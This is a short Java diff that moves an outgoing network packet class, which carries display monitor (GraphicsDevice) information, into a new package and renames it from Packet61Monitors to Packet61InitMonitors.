@@ -1,17 +1,16 @@
-package com.redpois0n;
+package com.redpois0n.packets.outgoing;
 
 import java.awt.GraphicsDevice;
 import java.awt.Rectangle;
 import java.io.DataOutputStream;
 
 import com.redpois0n.common.io.StringWriter;
-import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 
-public class Packet61Monitors extends AbstractOutgoingPacket {
+public class Packet61InitMonitors extends AbstractOutgoingPacket {
 	
 	private GraphicsDevice[] graphicsDevices;
 	
-	public Packet61Monitors(GraphicsDevice[] graphicsDevices) {
+	public Packet61InitMonitors(GraphicsDevice[] graphicsDevices) {
 		this.graphicsDevices = graphicsDevices;
 	}
 
